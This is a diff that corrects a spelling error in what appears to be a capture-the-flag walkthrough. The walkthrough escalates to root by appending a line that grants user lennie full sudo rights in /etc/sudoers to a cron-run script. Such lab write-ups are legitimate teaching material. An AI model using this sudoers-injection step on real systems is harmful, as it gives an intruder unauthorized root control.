@@ -550,7 +550,7 @@ lennie@startup:~$ ls -la /etc/print.sh
 -rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
 ```
 
-Knowing that root calls this program we can leverage this vulnerability by adding our own commands to the script that will be executed with root priviledges.
+Knowing that root calls this program we can leverage this vulnerability by adding our own commands to the script that will be executed with root privileges.
 
 One thing we can do is add Lennie to the ```etc/sudoers``` file so that we can run any program as sudo ourselves.
 
@@ -566,7 +566,7 @@ lennie@startup:~$ cat /etc/print.sh
 echo 'lennie ALL=(ALL) ALL' >> /etc/sudoers
 ```
 
-After about a minute or so a root cronjob should be executed and we can verify we have all sudo priviledges by running the ```sudo -l``` command.
+After about a minute or so a root cronjob should be executed and we can verify we have all sudo privileges by running the ```sudo -l``` command.
 
 ```
 lennie@startup:~$ sudo -l
